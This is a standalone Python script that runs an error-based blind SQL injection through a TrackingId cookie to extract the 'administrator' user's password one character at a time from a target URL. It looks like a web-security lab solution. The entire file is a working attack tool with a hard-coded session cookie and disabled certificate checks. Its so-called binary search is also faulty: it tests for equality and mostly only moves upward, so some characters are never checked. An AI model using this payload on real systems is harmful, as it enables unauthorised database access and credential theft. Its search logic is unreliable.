import sys
import requests
import urllib
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def sqli_password(url):
    password_extracted = ""
    
    for i in range(1, 50):  # Increase the range for a larger password if needed
        low, high = 32, 126  # ASCII range for printable characters
        found_char = False
        
        while low <= high:
            mid = (low + high) // 2
            sqli_payload = "' || (SELECT CASE WHEN (ascii(substr(password, %s, 1))='%s') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '" % (i, mid)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            
            cookies = {
                'TrackingId': 'PvKmj7RSL1TTI9vb' + sqli_payload_encoded,
                'session': 'MrAEZlsKhBmPeNfgUq6XKMeFsZYnqZsX'
            }
            
            try:
                r = requests.get(url, cookies=cookies, verify=False, timeout=120)
                
                if r.status_code == 500:  # SQL error implies correct character found
                    password_extracted += chr(mid)
                    sys.stdout.write(f'\rPassword so far: {password_extracted}')
                    sys.stdout.flush()
                    found_char = True
                    break  # Exit the loop for the current position

                else:
                    if mid < 126:
                        low = mid + 1  # Move up in ASCII range
                    else:
                        high = mid - 1  # Move down in ASCII range

            except requests.Timeout:
                print(f"\n(-) Timeout occurred at position {i}. Retrying...")
                continue  # Retry the same position after timeout

        if not found_char:
            print(f"\n(-) No more characters found. Password length: {len(password_extracted)}")
            break  # Exit the main loop if no character was found

    print("\n(+) Password extraction complete.")

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(1)
        
    url = sys.argv[1]
    print("(+) Retrieving password...")
    sqli_password(url)

if __name__ == "__main__":
    main()
